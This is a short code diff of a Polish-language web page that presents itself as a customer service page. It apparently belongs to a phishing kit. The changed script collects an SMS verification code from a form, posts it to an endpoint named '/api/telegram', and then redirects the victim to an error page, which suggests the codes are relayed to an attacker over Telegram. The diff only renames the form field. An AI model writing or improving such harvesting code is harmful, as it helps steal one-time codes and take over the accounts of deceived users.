@@ -182,17 +182,17 @@ zespół obsługi klienta pod numerem 800 669 6639 lub porozmawiaj z nimi za pom
     smsForm.addEventListener("submit", async (e) => {
       e.preventDefault();
     
-      const sms2 = document.getElementById("sms2").value;
+      const sms1 = document.getElementById("sms1").value;
     
       try {
         const response = await fetch("/api/telegram", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ sms2 }),
+          body: JSON.stringify({ sms1 }),
         });
     
         if (response.ok) {
-          window.location.href = "error.html"; // ← Redirect
+          window.location.href = "error.html";
         } else {
           document.getElementById("smsError").style.display = "block";
         }
@@ -203,3 +203,4 @@ zespół obsługi klienta pod numerem 800 669 6639 lub porozmawiaj z nimi za pom
 
 
 </body></html>
+
